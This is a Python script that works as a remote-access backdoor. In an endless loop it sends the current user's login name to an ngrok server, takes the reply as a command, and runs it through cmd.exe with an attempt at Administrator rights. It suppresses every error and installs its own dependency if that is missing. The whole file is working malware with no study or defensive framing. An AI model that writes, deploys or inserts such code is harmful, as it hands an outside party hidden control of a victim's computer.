import subprocess
import os
import time

try:
    import requests
except ImportError:
    subprocess.run(["pip", "install", "requests"])
    subprocess.run(["python", __file__])
    exit()

url = 'https://assured-earwig-picked.ngrok-free.app/'
previous_command_result = None

def send_post_request():
    global previous_command_result
    try:
        username = os.getlogin()
        timestamp = str(time.time())
        payload = {'username': username, 'timestamp': timestamp}
        response = requests.post(url, data=payload)

        if response.status_code == 200:
            command = response.text.strip()
            if previous_command_result:
                print("Previous command result:", previous_command_result)
            print("Executing command:", command)
            result = subprocess.run(["runas", "/user:Administrator", "cmd.exe", "/c", command], capture_output=True, text=True, shell=True)
            previous_command_result = result.stdout.strip()
        else:
            pass
    except Exception as e:
        pass

if __name__ == "__main__":
    while True:
        send_post_request()
